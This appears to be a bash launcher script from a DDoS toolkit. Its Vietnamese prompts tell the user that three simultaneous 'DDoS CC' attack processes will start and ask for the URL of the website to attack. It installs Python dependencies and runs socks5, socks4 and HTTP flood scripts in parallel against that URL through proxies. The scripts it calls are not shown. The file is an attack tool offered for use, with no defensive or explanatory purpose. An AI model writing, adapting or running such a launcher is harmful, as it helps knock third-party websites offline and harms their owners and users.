#!/bin/bash
echo Nhan Enter de tiep tuc. Sau khi an Enter se khoi chay 3 quy trinh tan cong DDoS CC cung luc. De co tuy chon khac, vui long su sung Termial.
echo Nhap URL trang web can tan cong:
read URL
PROXY="./"
VERIFY="-down -check"
export URL PROXY VERIFY
pip3 install -r requirements.txt
./linux/socks5.sh "$URL" "$PROXY" "$VERIFY" & ./linux/socks4.sh "$URL" "$PROXY" "$VERIFY" & ./linux/http.sh "$URL" "$PROXY" "$VERIFY"
